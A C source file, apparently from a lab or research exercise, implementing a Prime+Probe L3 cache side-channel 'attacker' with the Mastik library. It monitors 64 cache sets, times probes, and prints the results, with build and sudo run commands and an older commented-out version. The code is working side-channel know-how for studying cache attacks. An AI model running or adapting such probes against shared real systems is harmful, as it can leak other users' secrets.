#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <signal.h>
#include <x86intrin.h>

#include <mastik/l3.h>
#include <mastik/mm.h>

#define MONITOR_SETS 64

static int running = 1;

void stop(int sig) {
    running = 0;
}

static inline uint64_t rdtsc() {
    return __rdtsc();
}

int main() {

    signal(SIGINT, stop);

    printf("[*] Attacker started\n");

    l3info_t l3 = NULL;

    mm_t mm = mm_prepare(NULL, NULL, NULL);
    if (!mm) {
        printf("[-] mm_prepare failed\n");
        return 1;
    }

    l3pp_t pp = l3_prepare(l3, mm);
    if (!pp) {
        printf("[-] l3_prepare failed\n");
        return 1;
    }

    int total = l3_getSets(pp);
    printf("[+] Total L3 sets: %d\n", total);

    for (int i = 0; i < MONITOR_SETS; i++) {
        l3_monitor(pp, i);
    }

    printf("[+] Monitoring %d cache sets\n", MONITOR_SETS);

    uint16_t *results = malloc(sizeof(uint16_t) * MONITOR_SETS);

    while (running) {

        uint64_t t1 = rdtsc();          // start time

        l3_probe(pp, results);          // Prime + Probe inside Mastik

        uint64_t t2 = rdtsc();          // end time

        printf("Total probe time: %lu cycles | ", (t2 - t1));

        printf("Sets: ");
        for (int i = 0; i < MONITOR_SETS; i++) {
            printf("%5u ", results[i]);
        }
        printf("\n");

        usleep(200000);
    }

    l3_release(pp);
    mm_release(mm);
    free(results);
    return 0;
}

// gcc PP_ATTACKER.c -o pp_attacker \
// -I.. -I../mastik -I../src \
// ../src/libmastik.a -lpthread

// sudo taskset -c 0 ./pp_attacker


// #include <stdio.h>
// #include <stdlib.h>
// #include <stdint.h>
// #include <unistd.h>
// #include <signal.h>

// #include <mastik/l3.h>
// #include <mastik/mm.h>

// #define MONITOR_SETS 64

// static int running = 1;

// void stop(int sig) {
//     running = 0;
// }

// int main() {

//     signal(SIGINT, stop);

//     printf("[*] Attacker started\n");

//     // In this Mastik version, l3info is optional → pass NULL
//     l3info_t l3 = NULL;

//     // mm_prepare needs 3 args (l1, l2, l3 info) — all optional
//     mm_t mm = mm_prepare(NULL, NULL, NULL);
//     if (!mm) {
//         printf("[-] mm_prepare failed\n");
//         return 1;
//     }

//     l3pp_t pp = l3_prepare(l3, mm);
//     if (!pp) {
//         printf("[-] l3_prepare failed\n");
//         return 1;
//     }

//     int total = l3_getSets(pp);
//     printf("[+] Total L3 sets: %d\n", total);

//     if (total == 0) {
//         printf("[-] WARNING: Mastik failed to detect L3 sets, using fallback mode\n");
//     }

//     for (int i = 0; i < MONITOR_SETS; i++) {
//         l3_monitor(pp, i);
//     }

//     printf("[+] Monitoring %d cache sets\n", MONITOR_SETS);

//     uint16_t *results = malloc(sizeof(uint16_t) * MONITOR_SETS);

//     while (running) {

//         // In this API: l3_probe does prime+probe internally
//         l3_probe(pp, results);

//         printf("Probe: ");
//         for (int i = 0; i < MONITOR_SETS; i++) {
//             printf("%5u ", results[i]);
//         }
//         printf("\n");

//         usleep(200000);
//     }

//     l3_release(pp);
//     mm_release(mm);
//     free(results);
//     return 0;
// }



